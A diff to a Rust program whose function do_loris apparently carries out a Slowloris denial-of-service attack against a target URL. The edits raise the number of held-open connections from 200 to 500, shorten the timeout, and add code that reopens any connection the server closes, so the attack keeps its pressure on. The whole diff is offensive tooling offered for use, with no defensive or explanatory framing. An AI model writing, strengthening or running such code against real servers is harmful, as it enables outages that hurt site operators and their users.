@@ -51,12 +51,12 @@ where
 pub fn do_loris(url: &str) {
     let url = Url::parse(url).unwrap();
 
-    let connection_num = 200;
+    let connection_num = 500;
     let mut connections: Vec<_> = (0..connection_num)
         .map(|_| spawn_connection(&url))
         .collect();
 
-    let timeout = 5000;
+    let timeout = 4000;
     loop {
         println!("start");
         for connection in &mut connections {
@@ -64,7 +64,8 @@ pub fn do_loris(url: &str) {
             let res = connection.write_all(&loris_header);
             if res.is_err() {
                 println!("Connection closed!");
-            //std::mem::swap()
+                let mut new_connection = spawn_connection(&url);
+                std::mem::swap(connection, &mut new_connection);
             } else {
                 println!("Sleeping! zZzZzZ");
             }
